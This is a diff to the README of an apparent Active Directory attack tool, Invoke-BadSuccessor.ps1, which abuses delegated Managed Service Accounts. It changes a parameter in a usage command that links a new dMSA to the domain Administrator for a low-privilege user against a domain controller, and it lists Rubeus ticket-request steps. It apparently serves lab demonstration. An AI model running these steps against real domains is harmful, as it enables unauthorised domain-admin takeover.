@@ -40,7 +40,6 @@ Run the script with the following parameters:
 .\Invoke-BadSuccessor.ps1 `
   -Domain talokan.local `
   -OU BadOU `
-  -DMSAName NewDMSA `
   -LinkTargetDN "CN=Administrator,CN=Users,DC=talokan,DC=local" `
   -LowPrivUser "TALOKAN\namor" `
   -TargetHost "DC6.Talokan.local"
@@ -80,7 +79,7 @@ Each step includes an **interactive pause** so you can observe or validate chang
 ## 🧪 Example Output Flow
 
 - Machine account: `BadMachine1234`
-- dMSA: `NewDMSA`
+- dMSA: `BadDMSA1234`
 - TGT acquired via `Rubeus.exe asktgt`
 - TGS acquired via `Rubeus.exe asktgs /dmsa`
 - Access shown pre- and post-attack to demonstrate impact
